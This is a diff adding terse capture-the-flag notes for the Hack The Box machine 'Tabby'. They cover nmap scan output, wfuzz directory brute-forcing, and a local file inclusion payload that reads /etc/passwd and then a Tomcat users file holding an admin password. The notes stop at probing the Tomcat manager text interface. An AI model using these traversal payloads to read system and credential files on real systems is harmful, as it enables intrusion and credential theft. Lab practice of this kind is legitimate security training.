@@ -1,0 +1,49 @@
+TABBY 10.10.10.194
+ttl 63
+
+[+]NMAP[+]
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 45:3c:34:14:35:56:23:95:d6:83:4e:26:de:c6:5b:d9 (RSA)
+|   256 89:79:3a:9c:88:b0:5c:ce:4b:79:b1:02:23:4b:44:a6 (ECDSA)
+|_  256 1e:e7:b9:55:dd:25:8f:72:56:e8:8e:65:d5:19:b0:8d (ED25519)
+80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Mega Hosting
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+8080/tcp open  http    Apache Tomcat
+|_http-title: Apache Tomcat
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+[+]ENUMERATION[+]
+megahosting.htb:80
+❯ wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://megahosting.htb/FUZZ
+/assets
+/files
+
+megahosting.htb:8080
+❯ wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://megahosting.htb:8080/FUZZ
+/manager
+❯ wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://megahosting.htb:8080/manager/FUZZ
+/text
+
+
+[+]LFI[+]
+http://megahosting.htb/news.php?file=statement
+http://megahosting.htb/news.php?file=../../../../etc/passwd
+
+ash:x:1000:1000:clive:/home/ash:/bin/bash
+
+[+]TOMCAT[+] P:8080
+Users are defined in /etc/tomcat9/tomcat-users.xml.
+https://packages.ubuntu.com/focal/all/tomcat9/filelist
+
+GET /news.php?file=../../../../§§ >> intruder (https://packages.ubuntu.com/focal/all/tomcat9/filelist)
+/usr/share/tomcat9/etc/tomcat-users.xml >> <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager.
+
+[+] manager/text
+http://10.10.10.194:8080/manager/text
+FAIL - Unknown command [/text]
+
+https://tomcat.apache.org/tomcat-8.5-doc/host-manager-howto.html
